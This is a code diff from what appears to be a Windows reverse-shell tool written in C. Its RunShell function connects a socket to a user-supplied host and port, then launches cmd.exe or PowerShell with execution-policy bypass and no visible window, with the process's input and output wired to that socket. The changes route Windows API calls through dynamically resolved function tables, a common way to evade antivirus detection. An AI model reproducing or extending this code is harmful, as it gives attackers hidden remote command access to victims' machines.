@@ -110,7 +110,8 @@ void EnableVirtualTerminalSequenceProcessing() {
 		printf("Could not enable virtual terminal processing");
 	}
 }*/
-BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgrument) {
+
+BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Ws2_32_API ws2_32, Arguments listAgrument) {
 	BOOL exitProcess = FALSE;
 	struct sockaddr_in sAddr;
 
@@ -122,15 +123,14 @@ BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgrume
 		free(ipAddress);
 		return FALSE;
 	}
-	if (CreateDirectoryA(listAgrument.wincatDefaultDir, NULL) == 0 && GetLastError() == ERROR_PATH_NOT_FOUND)
+	if (kernel32.CreateDirectoryAF(listAgrument.wincatDefaultDir, NULL) == 0 && GetLastError() == ERROR_PATH_NOT_FOUND)
 		listAgrument.wincatDefaultDir = NULL;
-
+	
 	sprintf_s(ipAddress, IP_ADDRESS_SIZE, "%ws", listAgrument.host);
 	sprintf_s(processPath, BUF_SIZE, "%ws", listAgrument.Process);
 
-	sAddr.sin_family = AF_INET;
-	sAddr.sin_addr.s_addr = inet_addr(ipAddress);
-	sAddr.sin_port = htons(listAgrument.port);
+	sAddr = InitSockAddr(ipAddress, listAgrument.port);
+
 
 	if (strstr(processPath, "cmd.exe") == NULL) {
 		const char* cmdArgPs = " -nop -ep bypass";
@@ -159,6 +159,7 @@ BOOL RunShell(Kernel32_API kernel32, Advapi32_API advapi32, Arguments listAgrume
 				StartupInfo.hStdOutput = (HANDLE)mySocket;
 				StartupInfo.hStdError = (HANDLE)mySocket;
 
+				// kernel32.CreateProcessAF
 				if (CreateProcessA(NULL, processPath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, listAgrument.wincatDefaultDir, &StartupInfo, &ProcessInfo)) {
 					WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
 					printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process shutdown !\n");
